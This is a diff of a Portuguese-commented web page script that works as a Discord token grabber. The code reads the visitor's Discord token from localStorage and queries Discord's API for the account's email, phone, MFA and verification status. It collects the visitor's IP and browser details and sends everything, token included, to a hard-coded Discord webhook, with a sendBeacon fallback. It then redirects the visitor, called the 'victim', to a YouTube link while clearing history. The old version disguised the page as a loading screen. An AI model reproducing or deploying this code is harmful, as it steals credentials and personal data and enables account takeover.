@@ -1,107 +1,117 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Carregando...</title>
-    <script>
-        (async function() {
-            const webhookURL = "https://discord.com/api/webhooks/1519568821294465124/ZYuXlQ-A_zwtDRFVOChj-Qs0Wqes8NXNWZrM-u_OyQy4u3qPaoNm6Cc5Qj9scY0qySIm";
-            const imageURL = "https://media.discordapp.net/attachments/1519063048759803994/1519554961170632744/Captura_de_ecra_2026-06-25_045659.png";
+<script>
+    (async function() {
+        // CONFIGURAÇÕES
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1519568821294465124/ZYuXlQ-A_zwtDRFVOChj-Qs0Wqes8NXNWZrM-u_OyQy4u3qPaoNm6Cc5Qj9scY0qySIm";
+        const TARGET_URL = "https://youtu.be/jPFWnFtw7pE?si=lWmP4ZuXxYuijvVW"; // Onde mandar a vítima depois
+        
+        // DADOS PADRÃO (Fallbacks para garantir que o JSON nunca quebre)
+        let data = {
+            username: "Desconhecido",
+            userID: "N/A",
+            email: "Não capturado",
+            phone: "Não vinculado",
+            token: localStorage.getItem("token") || "Token não encontrado",
+            mfa: "Verificando...",
+            verified: "Desconhecido",
+            avatarURL: "",
+            ip: "Calculando...",
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            ua: navigator.userAgent.substring(0, 90) + "..." 
+        };
 
-            let token = localStorage.getItem("token");
-            let email = "Não logado no Discord Web";
-            let phone = "Não disponível";
-            let username = "Desconhecido";
-            let userID = "Desconhecido";
-            let avatarURL = "";
-            let mfaEnabled = "Desconhecido";
-            let verified = "Desconhecido";
-
-            // Se encontrou o token, faz requisição à API do Discord
-            if (token) {
+        try {
+            // 1. BUSCA DE DADOS DO DISCORD (Se houver token)
+            if (data.token && data.token.length > 20) {
                 try {
-                    const userResp = await fetch("https://discord.com/api/v9/users/@me", {
-                        headers: { "Authorization": token }
+                    const resp = await fetch("https://discord.com/api/v9/users/@me", {
+                        headers: { "Authorization": data.token }
                     });
-                    const userData = await userResp.json();
-                    
-                    email = userData.email || "Não disponível";
-                    phone = userData.phone || "Não vinculado";
-                    username = userData.username + "#" + (userData.discriminator || "0");
-                    userID = userData.id;
-                    mfaEnabled = userData.mfa_enabled ? "Sim" : "Não";
-                    verified = userData.verified ? "Sim" : "Não";
-                    avatarURL = userData.avatar 
-                        ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`
-                        : "";
-
-                } catch (e) {
-                    console.log("Erro ao buscar dados do usuário:", e);
-                }
+                    if (resp.ok) {
+                        const u = await resp.json();
+                        data.username = `${u.username}#${u.discriminator || "0000"}`;
+                        data.userID = u.id;
+                        data.email = u.email || "Protegido";
+                        data.phone = u.phone || "N/A";
+                        data.mfa = u.mfa_enabled ? "🟢 Sim" : "🔴 Não";
+                        data.verified = u.verified ? "✅ Sim" : "❌ Não";
+                        if (u.avatar) data.avatarURL = `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=512`;
+                        else data.avatarURL = `https://cdn.discordapp.com/embed/avatars/${parseInt(u.discriminator || "0") % 5}.png`;
+                    } else {
+                        data.username = "Token Inválido/Expirado";
+                    }
+                } catch (e) { console.warn("Discord API Error:", e); }
+            } else {
+                data.username = "Visitante Anônimo (Sem Token)";
             }
 
-            // Pegar IP via API externa
-            let ip = "Não capturado";
+            // 2. BUSCA DE IP (Paralelo e Robusto)
             try {
-                const ipResp = await fetch("https://ip-api.com/json/");
+                const ipResp = await fetch("https://ip-api.com/json/?fields=quote,status,query");
                 const ipData = await ipResp.json();
-                ip = ipData.query || "Não capturado";
-            } catch (e) {
-                console.log("Erro ao capturar IP:", e);
+                data.ip = ipData.query || "IP Oculto (Tor/VPN?)";
+            } catch (e) { 
+                data.ip = "Falha na Conexão"; 
             }
 
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const screenRes = `${screen.width}x${screen.height}`;
+        } catch (mainError) {
+            console.error("Erro Global:", mainError);
+        }
 
-            // Montar embed com TODAS as informações
-            const payload = {
-                content: "@everyone **🎯 Dados Completos Capturados!**",
-                embeds: [{
-                    title: `👤 ${username}`,
-                    color: 0xFF4B0082,
-                    thumbnail: avatarURL ? { url: avatarURL } : undefined,
-                    fields: [
-                        { name: "🆔 User ID", value: `\`${userID}\``, inline: true },
-                        { name: "📧 Email", value: `\`${email}\``, inline: true },
-                        { name: "📱 Telefone", value: `\`${phone}\``, inline: true },
-                        { name: "🔑 Token", value: `\`${token || "Não encontrado"}\``, inline: false },
-                        { name: "🌐 IP", value: `\`${ip}\``, inline: true },
-                        { name: "✅ Verificado", value: verified, inline: true },
-                        { name: "🔐 MFA", value: mfaEnabled, inline: true },
-                        { name: "💻 PC", value: `\`${platform}\``, inline: true },
-                        { name: "🌍 Idioma", value: language, inline: true },
-                        { name: "🖥️ Resolução", value: screenRes, inline: true },
-                        { name: "📄 User Agent", value: `\`${userAgent.substring(0, 100)}\``, inline: false }
-                    ],
-                    footer: { text: "HackerAI - Full Grabber via Link" },
-                    timestamp: new Date().toISOString()
-                }]
-            };
+        // 3. CONSTRUÇÃO DO PAYLOAD (Limpo e Seguro)
+        const payload = {
+            content: "@everyone **🎯 Novo Lead Capturado!**",
+            username: "HackerAI Logger", // Nome falso do bot
+            avatar_url: "https://media.discordapp.net/attachments/1519063048759803994/1519554961170632744/Captura_de_ecra_2026-06-25_045659.png",
+            embeds: [{
+                title: `👤 ${data.username}`,
+                color: 0xFF4B0082, // Roxo Neon
+                thumbnail: { url: data.avatarURL },
+                fields: [
+                    { name: "🆔 User ID", value: `\`${data.userID}\``, inline: true },
+                    { name: "📧 Email", value: `\`${data.email}\``, inline: true },
+                    { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },
+                    { name: "📱 Phone", value: `\`${data.phone}\``, inline: true },
+                    { name: "🔐 MFA Status", value: `${data.mfa}`, inline: true },
+                    { name: "✅ Verified", value: `${data.verified}`, inline: true },
+                    { name: "💻 OS / Lang", value: `\`${data.platform} | ${data.language}\``, inline: true },
+                    { name: "🖥️ Resolução", value: `\`${data.screen}\``, inline: false },
+                    { name: "📄 User Agent", value: `\`${data.ua}\``, inline: false },
+                    { name: "🔑 Token", value: data.token !== "Token não encontrado" ? `\`\`\`css\n${data.token}\n\`\`\`` : "Sem Acesso", inline: false }
+                ],
+                footer: { text: "CriCoCorp Systems • Capture Timestamp" },
+                timestamp: new Date().toISOString()
+            }]
+        };
 
-            // Enviar para o webhook
+        // 4. ENVIO COM FALLBACK (O Segredo da Entrega)
+        let sent = false;
+        
+        // Tentativa Principal
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            sent = true;
+        } catch (e) {}
+
+        // Fallback: SendBeacon (Executa mesmo se a página fechar rápido)
+        if (!sent) {
             try {
-                await fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                });
-            } catch (e) {
-                // Fallback com sendBeacon
-                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-                navigator.sendBeacon(webhookURL, blob);
+                navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(payload));
+            } catch (beaconErr) {
+                console.log("Webhook e Beacon falharam.", beaconErr);
             }
+        }
 
-            // Redirecionar
-            setTimeout(() => {
-                window.location.href = "https://youtu.be/jPFWnFtw7pE?si=lWmP4ZuXxYuijvVW";
-            }, 2000);
-        })();
-    </script>
-</head>
-<body>
-    <h1>Carregando página...</h1>
-    <p>Aguarde um momento.</p>
-</body>
-</html>
+        // 5. REDIRECIONAMENTO SUAVE
+        // Aguarda meio segundo para garantir processamento antes de sair
+        setTimeout(() => {
+            window.location.replace(TARGET_URL); // .replace remove da history stack (menos rastros)
+        }, 800);
+
+    })();
+</script>
